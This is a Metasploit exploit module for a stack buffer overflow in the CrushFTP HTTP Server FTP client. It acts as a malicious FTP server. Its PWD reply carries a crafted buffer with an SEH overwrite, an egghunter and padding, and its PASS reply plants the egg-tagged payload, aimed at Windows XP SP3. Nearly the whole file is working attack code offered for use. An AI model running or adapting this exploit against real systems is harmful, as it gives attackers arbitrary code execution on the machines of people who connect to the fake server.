# $Id: CrushFTP_HTTP_Server.rb 11039 2010-11-14 19:03:24Z jduck $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::Remote::FtpServer
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;CrushFTP HTTP Server Stack Buffer Overflow (PWD)&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a buffer overflow in CrushFTP HTTP Server ftp client.
                When processing the response on a PWD command, a stack based buffer overflow occurs.
                This leads to arbitrary code execution when a structured exception handler gets
                overwritten.
            },
            &#039;Author&#039;     =>
                [
                    &#039;Angel Injection&#039;, # found the bug
                    
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => "$Revision: 11039 $",
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;16869&#039;],
                    [ &#039;URL&#039;, &#039;http://www.1337day.com/exploits/&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;thread&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\xff\x0d\x5c\x2f\x0a",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;XP SP3 Universal&#039;, { &#039;Offset&#039; => 485, &#039;Ret&#039; => 0x100139E5  } ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Oct 12 2010&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
    end
 
    def setup
        super
        badchars = ""
        eggoptions =
        {
        :checksum => true,
        :eggtag => "W00T"
        }
        @hunter,@egg = generate_egghunter(payload.encoded,badchars,eggoptions)
    end
 
    def on_client_unknown_command(c,cmd,arg)
        c.put("200 OK\r\n")
    end
 
    def on_client_command_pass(c,arg)
        @state[c][:pass] = arg
        c.put("230 OK #{@egg}\r\n")
        return
    end
 
    def on_client_command_pwd(c,arg)
        junk1 = "A" * target[&#039;Offset&#039;]
        junk2 = "A" * 9
        nseh = "\x74\x06\x41\x41"
        jmp = "\x75\x08"
        seh = [target.ret].pack(&#039;V&#039;)
        junk3 = "D" * 22000
        #dual offset
        buffer = junk1 + nseh + seh + junk2 + jmp + nseh + seh + @hunter + junk3
        c.put("257 \"/\" #{buffer}\r\n")
        print_status("Sent payload, #{buffer.length} bytes")
        print_status("Wait for hunter ...")
        return
    end
 
end 



